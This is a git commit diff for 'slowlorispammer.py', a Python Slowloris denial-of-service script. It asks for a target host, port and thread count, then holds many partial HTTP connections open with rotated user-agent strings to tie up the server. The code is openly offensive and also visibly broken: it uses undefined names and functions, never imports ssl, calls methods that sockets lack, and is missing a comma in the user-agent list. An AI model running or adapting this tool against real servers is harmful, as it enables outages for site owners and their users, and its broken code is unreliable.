811ad5661a6845fc246d28e5c96a618faeaecad0
肉球の星遅れ <69009801+pawstar-lag@users.noreply.github.com>
2022-03-26 11:30:31 -0700

    Update slowlorispammer.py

--- slowlorispammer.py
+++ slowlorispammer.py
@@ -1,4 +1,31 @@
 import socket,threading,time,random,logging
+user_agents = [
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
+    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
+    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0"
+]
 target=input("[+] URL/IP: ")
 port=int(input("[+] Port: "))
 threads=int(input("[+] Threads: "))
@@ -17,31 +44,25 @@ if randuseragent == Y|y:
 elif randuseragent == N|n:
    randuseragent = False
    print("[+] Random user agent 'OFF'.")
+sleeptime=int(input("[+] Sleeptime: "))
 def init_socket(ip):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(4)
     if https:
         ctx = ssl.create_default_context()
         s = ctx.wrap_socket(s, server_hostname=target)
-
     s.connect((target, port))
-
     s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
-
     ua = user_agents[0]
     if randuseragent:
         ua = random.choice(user_agents)
-
     s.send_header("User-Agent", ua)
     s.send_header("Accept-language", "en-US,en,q=0.5")
     return s
-
-
 def main():
     ip = target
     socket_count = socket_count
     logging.info("Attacking %s with %s sockets.", ip, socket_count)
-
     logging.info("Creating sockets...")
     for _ in range(socket_count):
         try:
@@ -51,7 +72,6 @@ def main():
             logging.debug(e)
             break
         list_of_sockets.append(s)
-
     while True:
         try:
             logging.info(
@@ -73,11 +93,14 @@ def main():
                 except socket.error as e:
                     logging.debug(e)
                     break
-            logging.debug("Sleeping for %d seconds", args.sleeptime)
-            time.sleep(args.sleeptime)
+            logging.debug("Sleeping for %d seconds", sleeptime)
+            time.sleep(sleeptime)
 
         except (KeyboardInterrupt, SystemExit):
             logging.info("Stopping Slowloris")
             break
 for i in range(int(threads)):
-  break
+  t = threading.Thread(target=httpspam)
+  print("[+] Thread {0} created".format(str(i)))
+  t.start()
+  t.join()
